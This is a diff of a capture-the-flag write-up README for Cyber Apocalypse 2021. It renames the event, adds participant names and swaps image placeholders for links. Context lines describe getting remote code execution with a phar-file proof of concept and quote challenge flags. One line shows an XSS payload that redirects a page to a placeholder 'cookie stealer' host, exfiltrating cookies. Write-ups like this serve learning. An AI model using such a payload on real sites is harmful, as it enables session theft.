@@ -1,5 +1,6 @@
-# The Many Hats Club CTF
-The CTF was active from 14 Dec 2019 00:00 until 15 Dec 2019 23:59.
+# Cyber Apocalypse 2021
+The CTF was active from 19 Apr, 2021 22:00 until 24 Apr, 2021 08:00.
+Participants: sinfulz, Fugl, Legacyy, Pwning, payl0ad, x3ph, bread, firedank.
 
 ![](writeupfiles/ctfscore.png)
 
@@ -92,7 +93,7 @@ We can then search some more and we find a github page with a POC for the exploi
 
 If we create a phar file as the POC demonstrates and run the python script we get rce and we can find the flag in the root directory of the server:
 
-<image>
+![](writeupfiles/DaaS.png)
 
 ```
 CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
@@ -311,7 +312,7 @@ http://127.0.0.1:1337/<script>document.location=`http://YOUR_COOKIE_STEALER_HERE
 
 And there we have the flag!
 
-<image>
+![](writeupfiles/Bug_Report.png)
 
 ```
 CHTB{th1s_1s_my_bug_r3p0rt}
